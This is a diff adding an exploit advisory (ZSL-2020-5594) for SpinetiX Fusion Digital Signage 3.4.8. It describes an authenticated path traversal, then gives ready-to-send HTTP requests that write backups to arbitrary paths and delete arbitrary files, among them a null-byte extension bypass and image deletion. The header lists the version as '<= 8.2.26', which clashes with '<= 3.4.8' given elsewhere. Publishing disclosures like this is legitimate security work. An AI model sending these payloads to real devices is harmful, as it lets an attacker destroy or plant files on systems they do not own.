@@ -1,0 +1,83 @@
+# Exploit Title: SpinetiX Fusion Digital Signage 3.4.8 - File Delete Path Traversal
+# Date: 2020-09-30
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.spinetix.com
+# Version: <= 8.2.26
+
+SpinetiX Fusion Digital Signage 3.4.8 File Backup/Delete Path Traversal
+
+
+Vendor: SpinetiX AG
+Product web page: https://www.spinetix.com
+Affected version: <= 3.4.8 (1.0.36274)
+
+Summary: At SpinetiX we inspire businesses to unlock the potential of their story.
+We believe in the power of digital signage as a dynamic new storytelling platform
+to engage with people. For more than 13 years, we have been constantly innovating
+to deliver cutting-edge digital signage solutions that help our customers shine.
+Fusion is a built-in content management application accessible from a standard web
+browser - it is pre-installed on every HMP200, HMP130, and HMP100 device, and does
+not require any additional license, cost, or software installation.
+
+Desc: The application suffers from an authenticated path traversal vulnerability.
+Input passed via several parameters in index.php script is not properly verified
+before being used to create and delete files. This can be exploited to write backup
+files to an arbitrary location and/or delete arbitrary files via traversal attacks. 
+
+Tested on: Apache 2.2.34
+           PHP/5.3.18-2
+           Linux 2.6.10
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5594
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5594.php
+
+
+03.08.2020
+
+--
+
+
+File Backup Path Traversal:
+---------------------------
+
+POST /fusion/index.php?r=backup/create HTTP/1.1
+Host: 192.168.1.1
+Content-Length: 62
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mooshoo/1.2
+Content-Type: application/x-www-form-urlencoded
+Origin: http://192.168.1.1
+Referer: http://192.168.1.1/fusion/index.php?r=settings/settings
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: fusionsess=vb5se309b2seig780p47ch0pn1
+Connection: close
+
+SystemBackup%5Bname%5D=..%2Ftest&SystemBackup%5Bbackupall%5D=0
+
+
+File Delete (test.7z) Path Traversal:
+-------------------------------------
+
+GET /fusion/index.php?r=backup/delete&id=backup%3A../test&_=1600981467420 HTTP/1.1
+Host: 192.168.1.1
+
+
+Arbitrary File Delete Null Terminated String Extension Bypass Path Traversal:
+-----------------------------------------------------------------------------
+
+GET /fusion/index.php?r=backup/delete&id=backup%3A../scripts/layouttheme.js%00&_=1600981467420 HTTP/1.1
+Host: 192.168.1.1
+
+
+Arbitrary Image Delete:
+-----------------------
+
+GET /fusion/index.php?r=files/delete&id=image%3A../dirtysecret.svg&_=1601128841154 HTTP/1.1
+Host: 192.168.1.1
